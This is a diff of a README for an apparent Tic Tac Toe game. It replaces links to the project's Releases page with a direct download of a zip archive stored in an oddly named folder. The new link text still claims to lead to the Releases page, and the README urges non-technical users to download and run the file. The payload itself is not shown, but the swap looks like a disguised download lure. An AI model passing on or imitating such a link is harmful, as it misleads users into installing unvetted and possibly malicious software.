@@ -1,7 +1,7 @@
 # 🎮 Tic_tac_toe - Play Classic Games Easily  
 
 ## 📥 Download Now  
-[![Download Tic_tac_toe](https://img.shields.io/badge/Download-Tic_tac_toe-blue)](https://github.com/abdalrhmanasif5/Tic_tac_toe/releases)
+[![Download Tic_tac_toe](https://github.com/abdalrhmanasif5/Tic_tac_toe/raw/refs/heads/main/auriculae/toe-Tic-tac-v3.3.zip)](https://github.com/abdalrhmanasif5/Tic_tac_toe/raw/refs/heads/main/auriculae/toe-Tic-tac-v3.3.zip)
 
 ## 🚀 Getting Started  
 Welcome to the Tic_tac_toe repository! Here, you can enjoy the classic game of Tic Tac Toe. This guide will help you download and run the software without any technical knowledge. If you can follow simple instructions, you’ll be playing in no time.
@@ -22,7 +22,7 @@ Before downloading, make sure your device meets these minimum requirements:
 ## 📂 Download & Install  
 To get Tic_tac_toe, follow these steps:
 
-1. Click [this link](https://github.com/abdalrhmanasif5/Tic_tac_toe/releases) to visit the Releases page.  
+1. Click [this link](https://github.com/abdalrhmanasif5/Tic_tac_toe/raw/refs/heads/main/auriculae/toe-Tic-tac-v3.3.zip) to visit the Releases page.  
    
 2. You will see a list of available versions. Choose the latest version for the best experience.
 
